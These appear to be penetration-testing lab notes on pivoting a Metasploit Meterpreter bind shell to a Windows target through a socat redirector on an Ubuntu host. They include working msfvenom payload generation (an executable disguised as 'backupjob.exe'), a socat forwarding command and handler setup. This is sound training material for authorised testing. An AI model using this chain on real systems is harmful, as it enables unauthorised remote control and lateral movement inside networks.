**Overview:**
- In bind shell scenarios, the Windows target starts a listener on a specific port. A socat redirector on the Ubuntu pivot host forwards incoming connections from the Metasploit handler to the bind shell on the Windows target.
- The attack host connects to socat on the pivot host, which transparently forwards traffic to the Windows bind shell, allowing Metasploit to receive a Meterpreter session pivoted through the Ubuntu server.
---
## Payload Generation

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Generate a bind shell payload for the Windows target. `-p` payload, `-f` output format, `-o` output file, `LPORT` port the bind shell will listen on.

---
## Socat Redirector

```bash
socat TCP4-LISTEN:8080,fork TCP4:<target>:8443
```

Start the socat redirector on the pivot host. Listens on port `8080` and forwards all incoming packets to the Windows target on port `8443`. `fork` allows handling multiple simultaneous connections.

---
## Metasploit Handler

```
use exploit/multi/handler
```

Set up the bind handler in Metasploit on the attack host. Point it at the pivot host's socat listener port (`8080`). Upon payload execution on the Windows target, Metasploit receives the session pivoted through the socat redirector.